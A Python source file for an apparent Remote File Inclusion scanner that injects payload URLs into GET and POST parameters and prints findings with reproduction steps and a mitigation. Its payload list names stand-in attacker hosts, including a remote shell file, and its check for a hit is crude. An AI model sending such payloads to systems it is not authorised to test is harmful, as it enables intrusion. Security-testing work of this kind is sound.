import requests
import logging
import json
import html

logger = logging.getLogger(__name__)

class RFIScanner:
    def __init__(self, path, method, get_params, post_body):
        self.path = path
        self.method = method
        self.get_params = get_params
        self.post_body = post_body
        self.session = requests.Session()
        self.findings = []
        self.rfi_steps = []

    def scan(self):
        payloads = ["http://evil.com/malicious.php", "https://attacker.com/shell.txt"]
        
        # Test GET parameters
        for param in self.get_params:
            param_name = param['name']
            for payload in payloads:
                try:
                    if self.method == 'GET':
                        url = f"{self.path}?{param_name}={payload}"
                        response = self.session.get(url, timeout=5)
                        if response.status_code == 200 and "malicious" in response.text.lower():
                            self.rfi_steps.append(f'GET {url}')
                except requests.RequestException as e:
                    logger.error(f"RFI GET scan failed for {url}: {str(e)}")
                    continue
        
        # Test POST body
        if self.method == 'POST' and self.post_body:
            for param_name in self.post_body:
                for payload in payloads:
                    try:
                        data = {param_name: payload}
                        response = self.session.post(self.path, json=data, timeout=5)
                        if response.status_code == 200 and "malicious" in response.text.lower():
                            self.rfi_steps.append(f'POST {self.path} with {json.dumps(data)}')
                    except requests.RequestException as e:
                        logger.error(f"RFI POST scan failed for {self.path}: {str(e)}")
                        continue

        if self.rfi_steps:
            finding = {
                'type': 'Remote File Inclusion (RFI)',
                'severity': 'High',
                'description': 'The application is vulnerable to Remote File Inclusion attacks. RFI occurs when user-supplied input is used to include remote files from external servers, leading to potential code execution and unauthorized access.',
                'reproduce': '\n'.join(self.rfi_steps),
                'mitigation': 'Disallow remote file inclusion and validate inputs'
            }
            self.findings.append(finding)
            print(f"[VULN] {finding['type']} - Severity: {finding['severity']}")
            print(f"  Description: {finding['description']}")
            print(f"  Steps to Reproduce:\n{finding['reproduce']}")
            print(f"  Mitigation: {finding['mitigation']}\n")
            logger.info(f"Found: RFI at {self.path}")

        return self.findings